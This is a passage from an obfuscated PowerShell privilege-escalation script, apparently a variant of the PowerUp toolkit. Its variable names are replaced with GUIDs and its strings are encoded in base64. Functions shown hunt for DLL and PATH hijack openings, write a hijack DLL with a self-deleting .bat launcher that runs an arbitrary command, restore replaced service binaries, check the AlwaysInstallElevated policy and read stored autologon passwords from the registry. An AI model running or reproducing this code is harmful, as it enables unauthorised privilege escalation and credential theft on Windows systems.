                ${e12ed0c246424c08aa55f62c99ab53e5} = ${c3fc125f10214ca8918bb2b0a42af00b} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBiAGEAawA=')))
                Write-Verbose "Backing up '${c3fc125f10214ca8918bb2b0a42af00b}' to '${e12ed0c246424c08aa55f62c99ab53e5}'"
                try {
                    mi -Path ${c3fc125f10214ca8918bb2b0a42af00b} -Destination ${e12ed0c246424c08aa55f62c99ab53e5} -Force
                }
                catch {
                    Write-Warning "[*] Original path '${c3fc125f10214ca8918bb2b0a42af00b}' for '${cc65ff03bac14e3c93ae0d1263250bd2}' does not exist!"
                }
                ${4bb885f0137841d3ad45982082b8af7e} = @{
                    'ServiceName' = ${cc65ff03bac14e3c93ae0d1263250bd2}
                    'ServicePath' = ${c3fc125f10214ca8918bb2b0a42af00b}
                    'UserName' = ${a913b56191f84144ba519b305233ff1d}
                    'Password' = ${eaed2f8ac2be4efea8d07548d5c48416}
                    'LocalGroup' = ${b16577e783ee4711a57b9c7c86e8e332}
                    'Command' = ${c8f2338999514b2e859cc9473f0787c6}
                }
                ${bd522dee39524050891f459434e6b4ce} = Write-ServiceBinary @4bb885f0137841d3ad45982082b8af7e
                ${bd522dee39524050891f459434e6b4ce} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAGMAawB1AHAAUABhAHQAaAA='))) ${e12ed0c246424c08aa55f62c99ab53e5}
                ${bd522dee39524050891f459434e6b4ce}
            }
            catch {
                Write-Warning "Error: $_"
                ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject
                ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAA=='))) ${cc65ff03bac14e3c93ae0d1263250bd2}
                ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAdABoAA=='))) ${c3fc125f10214ca8918bb2b0a42af00b}
                ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZAA='))) $_
                ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAGMAawB1AHAAUABhAHQAaAA='))) ${e12ed0c246424c08aa55f62c99ab53e5}
                ${3511249d1e9f43519714ca9c156d8f53}
            }
        }
        else{
            Write-Warning "Target service '${cc65ff03bac14e3c93ae0d1263250bd2}' not found on the machine"
            ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAA=='))) ${cc65ff03bac14e3c93ae0d1263250bd2}
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAdABoAA=='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABmAG8AdQBuAGQA')))
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZAA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABmAG8AdQBuAGQA')))
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAGMAawB1AHAAUABhAHQAaAA='))) $Null
            ${3511249d1e9f43519714ca9c156d8f53}
        }
    }
}
function Restore-ServiceBinary {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        ${cc65ff03bac14e3c93ae0d1263250bd2},
        [String]
        ${e12ed0c246424c08aa55f62c99ab53e5}
    )
    process {
        ${1d0810300cb349249997357949a844aa} = gwmi -Class win32_service -Filter "Name='${cc65ff03bac14e3c93ae0d1263250bd2}'" | ? {$_}
        if (${1d0810300cb349249997357949a844aa}){
            try {
                ${c3fc125f10214ca8918bb2b0a42af00b} = (${1d0810300cb349249997357949a844aa}.PathName.Substring(0, ${1d0810300cb349249997357949a844aa}.PathName.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBlAHgAZQA=')))) + 4)).Replace('"',"")
                if (${e12ed0c246424c08aa55f62c99ab53e5} -eq $null -or ${e12ed0c246424c08aa55f62c99ab53e5} -eq ''){
                    ${e12ed0c246424c08aa55f62c99ab53e5} = ${c3fc125f10214ca8918bb2b0a42af00b} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBiAGEAawA=')))
                }
                cp -Path ${e12ed0c246424c08aa55f62c99ab53e5} -Destination ${c3fc125f10214ca8918bb2b0a42af00b} -Force
                rd -Path ${e12ed0c246424c08aa55f62c99ab53e5} -Force
                ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject
                ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAA=='))) ${cc65ff03bac14e3c93ae0d1263250bd2}
                ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAdABoAA=='))) ${c3fc125f10214ca8918bb2b0a42af00b}
                ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAGMAawB1AHAAUABhAHQAaAA='))) ${e12ed0c246424c08aa55f62c99ab53e5}
                ${3511249d1e9f43519714ca9c156d8f53}
            }
            catch{
                Write-Warning "Error: $_"
                ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject
                ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAA=='))) ${cc65ff03bac14e3c93ae0d1263250bd2}
                ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAdABoAA=='))) $_
                ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAGMAawB1AHAAUABhAHQAaAA='))) $Null
                ${3511249d1e9f43519714ca9c156d8f53}
            }
        }
        else{
            Write-Warning "Target service '${cc65ff03bac14e3c93ae0d1263250bd2}' not found on the machine"
            ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAA=='))) ${cc65ff03bac14e3c93ae0d1263250bd2}
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAdABoAA=='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABmAG8AdQBuAGQA')))
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAGMAawB1AHAAUABhAHQAaAA='))) $Null
            ${3511249d1e9f43519714ca9c156d8f53}
        }
    }
}
function Find-DLLHijack {
    [CmdletBinding()]
    Param(
        [Switch]
        ${d735a2b193d549bdb940da7ae4f52736},
        [Switch]
        ${dc679b3097a64fb9a7a1250254b85ec1},
        [Switch]
        ${bd3fbfe0de314a8cae13883bbb634f5c}
    )
    ${e12e52497f734f1388f7943a3bbbb324} = $ErrorActionPreference
    $ErrorActionPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
    ${84f8789a7aa14315849e0650b74a1b9d} = (gi $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFwAUwB5AHMAdABlAG0AXABDAHUAcgByAGUAbgB0AEMAbwBuAHQAcgBvAGwAUwBlAHQAXABDAG8AbgB0AHIAbwBsAFwAUwBlAHMAcwBpAG8AbgAgAE0AYQBuAGEAZwBlAHIAXABLAG4AbwB3AG4ARABMAEwAcwA='))))
    ${c2b45037f50f414898f7005d53c7e765} = $(ForEach ($name in ${84f8789a7aa14315849e0650b74a1b9d}.GetValueNames()) { ${84f8789a7aa14315849e0650b74a1b9d}.GetValue($name) }) | ? { $_.EndsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBkAGwAbAA=')))) }
    ${a1d4b1e9150648768f530b4bbf7916e8} = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    ${9e8be8d6c11c457bbd8afc27cbbce750} = @{}
    gwmi -Class win32_process | ? {$_} | % {${9e8be8d6c11c457bbd8afc27cbbce750}[$_.handle] = $_.getowner().user}
    ForEach ($Process in ps | ? {$_.Path}) {
        ${786afe2f4a2e4de7b004263c2417c086} = $Process.Path | Split-Path -Parent
        ${8b5cf04af59442309fd16f0b61b5519a} = $Process.Modules
        ${005d03adf3a44f108dd4ba995fa0d622} = ${9e8be8d6c11c457bbd8afc27cbbce750}[$Process.id.tostring()]
        ForEach ($Module in ${8b5cf04af59442309fd16f0b61b5519a}){
            ${1df6182f7c0245a78105dd6b543852ca} = "${786afe2f4a2e4de7b004263c2417c086}\$($module.ModuleName)"
            if ((-not ${1df6182f7c0245a78105dd6b543852ca}.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgA='))))) -and (-not (Test-Path -Path ${1df6182f7c0245a78105dd6b543852ca})) -and (${c2b45037f50f414898f7005d53c7e765} -NotContains $Module.ModuleName)) {
                ${2204f2b279724f548ba648e3b4d91bde} = $False
                if ( ${d735a2b193d549bdb940da7ae4f52736}.IsPresent -and ${1df6182f7c0245a78105dd6b543852ca}.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVwBpAG4AZABvAHcAcwA=')))) ){
                    ${2204f2b279724f548ba648e3b4d91bde} = $True
                }
                if ( ${dc679b3097a64fb9a7a1250254b85ec1}.IsPresent -and ${1df6182f7c0245a78105dd6b543852ca}.Contains($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwA=')))) ){
                    ${2204f2b279724f548ba648e3b4d91bde} = $True
                }
                if ( ${bd3fbfe0de314a8cae13883bbb634f5c}.IsPresent -and ${a1d4b1e9150648768f530b4bbf7916e8}.Contains(${005d03adf3a44f108dd4ba995fa0d622}) ){
                    ${2204f2b279724f548ba648e3b4d91bde} = $True
                }
                if (-not ${2204f2b279724f548ba648e3b4d91bde}){
                    ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject 
                    ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBQAGEAdABoAA=='))) $Process.Path
                    ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAA=='))) ${005d03adf3a44f108dd4ba995fa0d622}
                    ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGoAYQBjAGsAYQBiAGwAZQBQAGEAdABoAA=='))) ${1df6182f7c0245a78105dd6b543852ca}
                    ${3511249d1e9f43519714ca9c156d8f53}
                }
            }
        }
    }
    $ErrorActionPreference = ${e12e52497f734f1388f7943a3bbbb324}
}
function Find-PathHijack {
    [CmdletBinding()]
    Param()
    ${e12e52497f734f1388f7943a3bbbb324} = $ErrorActionPreference
    $ErrorActionPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
    ${834bd27d941a4230abb91f154b3dca09} = (gi Env:Path).value.split(';') | ? {$_ -ne ""}
    ForEach (${d3bfda1f12f74d9da143c7e63466c346} in ${834bd27d941a4230abb91f154b3dca09}){
        ${d3bfda1f12f74d9da143c7e63466c346} = ${d3bfda1f12f74d9da143c7e63466c346}.Replace('"',"")
        if (-not ${d3bfda1f12f74d9da143c7e63466c346}.EndsWith("\")){
            ${d3bfda1f12f74d9da143c7e63466c346} = ${d3bfda1f12f74d9da143c7e63466c346} + "\"
        }
        ${57c17e0c07e74b3fa81a33852d56c4d6} = Join-Path ${d3bfda1f12f74d9da143c7e63466c346} ([IO.Path]::GetRandomFileName())
        if(-not $(Test-Path -Path ${d3bfda1f12f74d9da143c7e63466c346})){
            try {
                $Null = ni -ItemType directory -Path ${d3bfda1f12f74d9da143c7e63466c346}
                echo $Null > ${57c17e0c07e74b3fa81a33852d56c4d6}
                ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject 
                ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGoAYQBjAGsAYQBiAGwAZQBQAGEAdABoAA=='))) ${d3bfda1f12f74d9da143c7e63466c346}
                ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBiAHUAcwBlAEYAdQBuAGMAdABpAG8AbgA='))) "Write-HijackDll -OutputFile '${d3bfda1f12f74d9da143c7e63466c346}\wlbsctrl.dll' -Command '...'"
                ${3511249d1e9f43519714ca9c156d8f53}
            }
            catch {}
            finally {
                rd -Path ${d3bfda1f12f74d9da143c7e63466c346} -Recurse -Force -ErrorAction SilentlyContinue
            }
        }
        else{
            try {
                echo $Null > ${57c17e0c07e74b3fa81a33852d56c4d6}
                ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject 
                ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGoAYQBjAGsAYQBiAGwAZQBQAGEAdABoAA=='))) ${d3bfda1f12f74d9da143c7e63466c346}
                ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBiAHUAcwBlAEYAdQBuAGMAdABpAG8AbgA='))) "Write-HijackDll -OutputFile '${d3bfda1f12f74d9da143c7e63466c346}\wlbsctrl.dll' -Command '...'"
                ${3511249d1e9f43519714ca9c156d8f53}
            }
            catch {} 
            finally {
                rd ${57c17e0c07e74b3fa81a33852d56c4d6} -Force -ErrorAction SilentlyContinue
            }
        }
    }
    $ErrorActionPreference = ${e12e52497f734f1388f7943a3bbbb324}
}
function Write-HijackDll {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [String]
        ${b5c2c152a1bf4c378090fe922ead6017},
        [Parameter(Mandatory = $True)]
        [String]
        ${c8f2338999514b2e859cc9473f0787c6},
        [String]
        ${e08f4d6fe7ce4270b51a3c3161e9f966},        
        [String]
        ${ef620b47936a4b7fb28e918863b4b6fc}
    )
    function local:Invoke-PatchDll {
        [CmdletBinding()]
        param(
            [Parameter(Mandatory = $True)]
            [Byte[]]
            ${a8f28f7d69a74c529872082777904f87},
            [Parameter(Mandatory = $True)]
            [String]
            ${ea25d0724cf242ab8c5c782d0220e1c8},
            [Parameter(Mandatory = $True)]
            [String]
            ${da9065158c1447bf8cd8ea284cf1ead1}
        )
        ${37f28e55567c41938e0bbe93b1714b49} = ([system.Text.Encoding]::UTF8).GetBytes(${ea25d0724cf242ab8c5c782d0220e1c8})
        ${233baa49717d427f8baa368037f796a4} = ([system.Text.Encoding]::UTF8).GetBytes(${da9065158c1447bf8cd8ea284cf1ead1})
        ${0925565f7c71496a8a4951a7d8069f3e} = 0
        ${9ad865e8196a45a392246b25384c5903} = [System.Text.Encoding]::ASCII.GetString(${a8f28f7d69a74c529872082777904f87})
        ${0925565f7c71496a8a4951a7d8069f3e} = ${9ad865e8196a45a392246b25384c5903}.IndexOf(${ea25d0724cf242ab8c5c782d0220e1c8})
        if(${0925565f7c71496a8a4951a7d8069f3e} -eq 0)
        {
            throw("Could not find string ${ea25d0724cf242ab8c5c782d0220e1c8} !")
        }
        for (${edb551fa736245b6b29fdbd71c23b32f}=0; ${edb551fa736245b6b29fdbd71c23b32f} -lt ${233baa49717d427f8baa368037f796a4}.Length; ${edb551fa736245b6b29fdbd71c23b32f}++)
        {
            ${a8f28f7d69a74c529872082777904f87}[${0925565f7c71496a8a4951a7d8069f3e}+${edb551fa736245b6b29fdbd71c23b32f}]=${233baa49717d427f8baa368037f796a4}[${edb551fa736245b6b29fdbd71c23b32f}]
        }
        return ${a8f28f7d69a74c529872082777904f87}
    }
    ${812ba0ce10314958a8161e0d98f2411d} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABW...AA=='))) The omitted 'VABW...AA==' is actually a 140184 character long Base64 string.
    ${cce102b2af644805979d6b1416d911de} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABWA...AQQA='))) # The omitted 'VABWA...AQQA=' is actually a 158380 character long Base64 string.
    if(${ef620b47936a4b7fb28e918863b4b6fc}) {
        if(${ef620b47936a4b7fb28e918863b4b6fc} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eAA2ADQA')))) {
            [Byte[]]${a8f28f7d69a74c529872082777904f87} = [Byte[]][Convert]::FromBase64String(${cce102b2af644805979d6b1416d911de})
        }
        elseif(${ef620b47936a4b7fb28e918863b4b6fc} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eAA4ADYA')))) {
            [Byte[]]${a8f28f7d69a74c529872082777904f87} = [Byte[]][Convert]::FromBase64String(${812ba0ce10314958a8161e0d98f2411d})
        }
        else{
            Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABsAGUAYQBzAGUAIABzAHAAZQBjAGkAZgB5ACAAeAA4ADYAIABvAHIAIAB4ADYANAAgAGYAbwByACAAdABoAGUAIAAtAEEAcgBjAGgA')))
        }
    }
    else {
        if ($Env:PROCESSOR_ARCHITECTURE -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBNAEQANgA0AA==')))) {
            [Byte[]]${a8f28f7d69a74c529872082777904f87} = [Byte[]][Convert]::FromBase64String(${cce102b2af644805979d6b1416d911de})
            ${ef620b47936a4b7fb28e918863b4b6fc} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eAA2ADQA')))
        }
        else {
            [Byte[]]${a8f28f7d69a74c529872082777904f87} = [Byte[]][Convert]::FromBase64String(${812ba0ce10314958a8161e0d98f2411d})
            ${ef620b47936a4b7fb28e918863b4b6fc} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eAA4ADYA')))
        }
    }
    if(!${e08f4d6fe7ce4270b51a3c3161e9f966}) {
        ${e27ddcbc49bb4eb3b09b9690f7c4d4ad} = ${b5c2c152a1bf4c378090fe922ead6017}.split("\")
        ${e08f4d6fe7ce4270b51a3c3161e9f966} = (${e27ddcbc49bb4eb3b09b9690f7c4d4ad}[0..$(${e27ddcbc49bb4eb3b09b9690f7c4d4ad}.length-2)] -join "\") + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABkAGUAYgB1AGcALgBiAGEAdAA=')))
    }
    else {
        ${a8f28f7d69a74c529872082777904f87} = Invoke-PatchDll -a8f28f7d69a74c529872082777904f87 ${a8f28f7d69a74c529872082777904f87} -ea25d0724cf242ab8c5c782d0220e1c8 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAGIAdQBnAC4AYgBhAHQA'))) -da9065158c1447bf8cd8ea284cf1ead1 ${e08f4d6fe7ce4270b51a3c3161e9f966}
    }
    if (Test-Path ${e08f4d6fe7ce4270b51a3c3161e9f966}) { rd -Force ${e08f4d6fe7ce4270b51a3c3161e9f966} }
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QABlAGMAaABvACAAbwBmAGYAXABuAA=='))) | Out-File -Encoding ASCII -Append ${e08f4d6fe7ce4270b51a3c3161e9f966} 
    "start /b ${c8f2338999514b2e859cc9473f0787c6}" | Out-File -Encoding ASCII -Append ${e08f4d6fe7ce4270b51a3c3161e9f966} 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGEAcgB0ACAALwBiACAAIgAiACAAYwBtAGQAIAAvAGMAIABkAGUAbAAgACIAJQB+AGYAMAAiACYAZQB4AGkAdAAgAC8AYgA='))) | Out-File -Encoding ASCII -Append ${e08f4d6fe7ce4270b51a3c3161e9f966}
    ".bat launcher written to: ${e08f4d6fe7ce4270b51a3c3161e9f966}"
    sc -Value ${a8f28f7d69a74c529872082777904f87} -Encoding Byte -Path ${b5c2c152a1bf4c378090fe922ead6017}
    "${ef620b47936a4b7fb28e918863b4b6fc} DLL Hijacker written to: ${b5c2c152a1bf4c378090fe922ead6017}"
    ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject 
    ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQARgBpAGwAZQA='))) ${b5c2c152a1bf4c378090fe922ead6017}
    ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))) ${ef620b47936a4b7fb28e918863b4b6fc}
    ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBBAFQATABhAHUAbgBjAGgAZQByAFAAYQB0AGgA'))) ${e08f4d6fe7ce4270b51a3c3161e9f966}
    ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZAA='))) ${c8f2338999514b2e859cc9473f0787c6}
    ${3511249d1e9f43519714ca9c156d8f53}
}
function Get-RegAlwaysInstallElevated {
    [CmdletBinding()]
    Param()
    ${e12e52497f734f1388f7943a3bbbb324} = $ErrorActionPreference
    $ErrorActionPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
    if (Test-Path $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAEkAbgBzAHQAYQBsAGwAZQByAA==')))) {
        ${868db69531344d5cbfd45b388c246b00} = (gp -Path $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAEkAbgBzAHQAYQBsAGwAZQByAA=='))) -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
        Write-Verbose "HKLMval: $(${868db69531344d5cbfd45b388c246b00}.AlwaysInstallElevated)"
        if (${868db69531344d5cbfd45b388c246b00}.AlwaysInstallElevated -and (${868db69531344d5cbfd45b388c246b00}.AlwaysInstallElevated -ne 0)){
            ${715a0e52c0ff4589b2aaa39ff45f0cf2} = (gp -Path $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABrAGMAdQA6AFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAEkAbgBzAHQAYQBsAGwAZQByAA=='))) -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
            Write-Verbose "HKCUval: $(${715a0e52c0ff4589b2aaa39ff45f0cf2}.AlwaysInstallElevated)"
            if (${715a0e52c0ff4589b2aaa39ff45f0cf2}.AlwaysInstallElevated -and (${715a0e52c0ff4589b2aaa39ff45f0cf2}.AlwaysInstallElevated -ne 0)){
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAHcAYQB5AHMASQBuAHMAdABhAGwAbABFAGwAZQB2AGEAdABlAGQAIABlAG4AYQBiAGwAZQBkACAAbwBuACAAdABoAGkAcwAgAG0AYQBjAGgAaQBuAGUAIQA=')))
                $True
            }
            else{
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAHcAYQB5AHMASQBuAHMAdABhAGwAbABFAGwAZQB2AGEAdABlAGQAIABuAG8AdAAgAGUAbgBhAGIAbABlAGQAIABvAG4AIAB0AGgAaQBzACAAbQBhAGMAaABpAG4AZQAuAA==')))
                $False
            }
        }
        else{
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAHcAYQB5AHMASQBuAHMAdABhAGwAbABFAGwAZQB2AGEAdABlAGQAIABuAG8AdAAgAGUAbgBhAGIAbABlAGQAIABvAG4AIAB0AGgAaQBzACAAbQBhAGMAaABpAG4AZQAuAA==')))
            $False
        }
    }
    else{
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAEkAbgBzAHQAYQBsAGwAZQByACAAZABvAGUAcwAgAG4AbwB0ACAAZQB4AGkAcwB0AA==')))
        $False
    }
    $ErrorActionPreference = ${e12e52497f734f1388f7943a3bbbb324}
}
function Get-RegAutoLogon {
    [CmdletBinding()]
    Param()
    ${7b014c7caa9346fd8f3a30fd560b74ca} = $(gp -Path $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAE4AVABcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAFcAaQBuAGwAbwBnAG8AbgA='))) -Name AutoAdminLogon -ErrorAction SilentlyContinue)
    Write-Verbose "AutoAdminLogon key: $(${7b014c7caa9346fd8f3a30fd560b74ca}.AutoAdminLogon)"
    if (${7b014c7caa9346fd8f3a30fd560b74ca}.AutoAdminLogon -ne 0){
        ${1a3b401732c541eda7dfe519bec9bed4} = $(gp -Path $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAE4AVABcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAFcAaQBuAGwAbwBnAG8AbgA='))) -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
        ${37ec27760c9543068870e8b7a40076fb} = $(gp -Path $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAE4AVABcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAFcAaQBuAGwAbwBnAG8AbgA='))) -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
        ${6702e45622bd41a8a3d84b0b3f1b2340} = $(gp -Path $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAE4AVABcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAFcAaQBuAGwAbwBnAG8AbgA='))) -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
        ${dd34dac698824e0599596241032b9e26} = $(gp -Path $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAE4AVABcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAFcAaQBuAGwAbwBnAG8AbgA='))) -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
